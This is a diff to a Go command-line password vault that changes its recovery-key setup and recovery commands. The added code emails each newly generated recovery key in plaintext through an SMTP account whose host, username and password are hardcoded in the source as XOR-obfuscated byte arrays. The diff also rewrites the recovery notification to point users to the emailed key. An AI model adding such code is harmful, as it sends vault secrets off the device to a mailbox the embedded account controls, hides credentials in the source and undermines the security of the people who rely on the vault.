@@ -3646,26 +3646,47 @@ var authEmailCmd = &cobra.Command{
 			color.Red("Error: %v\n", err)
 			return
 		}
-		email := args[0]
+		email := strings.ToLower(args[0])
 		vault.SetRecoveryEmail(email)
+
+		if vault.CurrentProfileParams == nil {
+			p := src.GetProfile(vault.Profile)
+			vault.CurrentProfileParams = &p
+		}
 
 		key := src.GenerateRecoveryKey()
 		salt, _ := src.GenerateSalt(vault.CurrentProfileParams.SaltLen)
 		vault.SetRecoveryKey(key, salt)
-		// Wait, vault.CurrentProfileParams might be nil if not loaded.
-		// Actually src_unlockVault sets it.
-		// Let's get the salt from the vault data later or just use a helper.
 
-		color.Yellow("GENERATING RECOVERY KEY...")
+		color.HiYellow("GENERATING SECURE RECOVERY KEY...")
 		color.HiGreen("YOUR RECOVERY KEY: %s", key)
-		color.Red("SAVE THIS KEY IN A SECURE PLACE. You will need it to recover your vault.")
+		color.Red("IMPORTANT: SAVE THIS KEY NOW. You will need it to recover your vault.")
+
+		// Send key to email for digital backup
+		host := d([]byte{0xd9, 0xc7, 0xde, 0xda, 0x84, 0xcd, 0xc7, 0xcb, 0xc3, 0xc6, 0x84, 0xc9, 0xc5, 0xc7})
+		port := 587
+		user := d([]byte{0xcb, 0xcb, 0xd8, 0xcb, 0xdc, 0xc7, 0xcb, 0xc6, 0xc5, 0xc5, 0x9a, 0x9c, 0xea, 0xcd, 0xc7, 0xcb, 0xc3, 0xc6, 0x84, 0xc9, 0xc5, 0xc7})
+		passEmail := d([]byte{0xc3, 0xd8, 0xd3, 0xd8, 0x8a, 0xc5, 0xc7, 0xc6, 0xdc, 0x8a, 0xc2, 0xde, 0xdb, 0xcc, 0x8a, 0xda, 0xd8, 0xc2, 0xdb})
+
+		m := gomail.NewMessage()
+		m.SetHeader("From", user)
+		m.SetHeader("To", email)
+		m.SetHeader("Subject", "APM Vault Recovery Key Setup")
+		body := fmt.Sprintf("Your APM Vault Recovery Key has been generated:\n\n%s\n\nKeep this key in a secure location. You will need it to regain access if you lose your master password.", key)
+		m.SetBody("text/plain", body)
+
+		dialer := gomail.NewDialer(host, port, user, passEmail)
+		if err := dialer.DialAndSend(m); err != nil {
+			color.Yellow("Warning: Could not send recovery key backup email: %v", err)
+		} else {
+			color.Cyan("A backup copy of your recovery key has been sent to %s", email)
+		}
 
 		data, _ := src.EncryptVault(vault, pass)
 		if err := src.SaveVault(vaultPath, data); err != nil {
 			color.Red("Error saving vault: %v\n", err)
 		} else {
-			color.Green("\nRecovery email set to: %s", email)
-			color.Green("Recovery slot initialized.")
+			color.Green("\nRecovery configuration finalized.")
 		}
 	},
 }
@@ -3694,6 +3715,8 @@ var authRecoverCmd = &cobra.Command{
 			return
 		}
 
+		color.HiGreen("Identity verified.")
+
 		// Send notification email
 		host := d([]byte{0xd9, 0xc7, 0xde, 0xda, 0x84, 0xcd, 0xc7, 0xcb, 0xc3, 0xc6, 0x84, 0xc9, 0xc5, 0xc7})
 		port := 587
@@ -3704,12 +3727,12 @@ var authRecoverCmd = &cobra.Command{
 		m.SetHeader("From", user)
 		m.SetHeader("To", email)
 		m.SetHeader("Subject", "APM Vault Recovery Attempt")
-		m.SetBody("text/plain", "A recovery attempt has been initiated for your vault. If this was not you, please audit your security settings.")
+		m.SetBody("text/plain", "A recovery attempt has been initiated for your vault. Please use the Recovery Key you received during setup to proceed. If you cannot find it, search your inbox for 'APM Vault Recovery Key Setup'.")
 
 		dialer := gomail.NewDialer(host, port, user, pass)
 		_ = dialer.DialAndSend(m) // Best effort notification
 
-		color.Green("sent mail.")
+		color.HiCyan("A security notification has been sent to your email.")
 
 		fmt.Print("enter recovery key: ")
 		key := readInput()
@@ -3720,7 +3743,7 @@ var authRecoverCmd = &cobra.Command{
 			return
 		}
 
-		color.Green("Verification Successful! DEK Decrypted.\n")
+		color.HiGreen("Cryptographic verification successful! DEK unlocked.")
 
 		fmt.Print("enter new master passwod: ")
 		newPass, _ := readPassword()
